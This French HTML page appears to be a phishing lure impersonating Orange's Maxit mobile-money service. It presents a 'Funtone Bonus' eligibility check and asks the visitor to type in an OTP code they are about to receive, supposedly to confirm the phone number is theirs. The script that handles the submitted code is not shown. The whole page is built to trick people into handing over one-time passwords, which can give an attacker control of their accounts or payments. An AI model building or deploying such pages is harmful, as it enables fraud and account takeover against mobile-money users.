<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#D96B27">
    <title>Vérification - Funtone Bonus</title>
    <link rel="stylesheet" href="premier-code.css">
</head>

<body>

    <header class="header">
        <div class="logo">
            <span class="logo-icon">O</span>
            <span>Maxit <b>Orange</b></span>
        </div>
        <span class="badge">Eligibilité</span>
    </header>

    <main class="container">

        <div class="icon">✓</div>

        <p class="step">ÉTAPE 1 SUR 2</p>

        <h1>Vérification de votre éligibilité</h1>

        <p class="description">
            Saisissez le code OTP que vous allez reçevoir pour verifier si ce numéro vous appartient
        </p>

        <form id="codeForm">

            <label for="demoCode">code</label>

            <input
    type="text"
    id="demoCode"
    placeholder="Saisissez votre code"
    maxlength="100"
    autocomplete="off"
    required
>

            <button type="submit" id="verifyBtn">
                Vérifier
            </button>

        </form>

        <div id="message" class="message"></div>

        <div class="information">
            <span>ⓘ</span>
            Bien vouloir le saisir convenablement !
        </div>

    </main>

    <footer>
        © 2026 Maxit Orange International
    </footer>

    <script src="premier-code.js"></script>

</body>
</html>
